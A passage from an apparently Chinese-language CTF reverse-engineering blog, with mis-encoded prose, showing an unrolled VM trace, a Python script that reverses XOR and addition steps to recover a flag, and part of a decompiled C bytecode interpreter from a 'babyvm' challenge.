class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">now_num = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>ç„¶ååŒ–ç®€é€†å‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x16</span>, <span class="number">0x42</span>, <span class="number">0x39</span>, <span class="number">0x0F</span>, </span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, </span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x81</span>, </span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x2C</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># last = [0]*100</span></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     b1 = input[now_num]</span></span><br><span class="line"><span class="comment">#     now_num += 1</span></span><br><span class="line"><span class="comment">#     b2 = input[now_num]</span></span><br><span class="line"><span class="comment">#     or_num = b1 | b2</span></span><br><span class="line"><span class="comment">#     not_1 = ~b1</span></span><br><span class="line"><span class="comment">#     not_2 = ~b2</span></span><br><span class="line"><span class="comment">#     or_not_num = not_2 | not_1</span></span><br><span class="line"><span class="comment">#     last[now_num - 1] = or_not_num &amp; or_num</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     save = last[now_num]</span></span><br><span class="line"><span class="comment">#     now_num+=1</span></span><br><span class="line"><span class="comment">#     last[now_num-1] = now_num + save - 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]-=i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]^=last[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment">#NSSCTF&#123;H@ppy_Ch1ne5_NEwY3ar!1!1&#125;</span></span><br></pre></td></tr></table></figure><p>å°ç»“ï¼šè¿™ä¸ªé¢˜å’Œä¹‹å‰é‡åˆ°çš„jvmé‚£é“é¢˜ä¸€æ ·ï¼Œéƒ½è¦è§£ææŒ‡ä»¤ï¼Œè¿˜åŸæµç¨‹</p><h2 id="ç¾ŠåŸæ¯2021-babyvm">ç¾ŠåŸæ¯2021 babyvm</h2><p>è¿™ä¸ªé¢˜ä¸€æ ·ï¼Œåªæ˜¯åœ¨å‰é¢åŠ äº†ä¸€ä¸ªåŠ¨æ€è°ƒè¯•</p><p>æŒ‡ä»¤ç å¤§æ¦‚æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_80487A8</span><span class="params">(_DWORD *reg)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"><span class="type">int</span> reg[<span class="number">999</span>];</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">113</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">6</span>] -= <span class="number">4</span>;</span><br><span class="line">      *(_DWORD *)reg[<span class="number">6</span>] = *(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">65</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] += reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] -= reg[<span class="number">4</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">67</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">56</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">57</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">53</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xF7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">68</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] /= reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[sub_804875F(reg, <span class="number">1</span>)] = *(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">2</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">119</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">83</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(*(<span class="type">char</span> *)reg[<span class="number">3</span>]);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">34</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0x99</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">118</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">3</span>] = *(_DWORD *)reg[<span class="number">6</span>];</span><br><span class="line">      *(_DWORD *)reg[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">      reg[<span class="number">6</span>] += <span class="number">4</span>;</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">84</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (_BYTE *)reg[<span class="number">3</span>];</span><br><span class="line">      *v1 = getchar();</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">48</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] |= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">3</span>] = *(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = <span class="number">1877735783</span>;</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">51</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">2</span>] = *(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      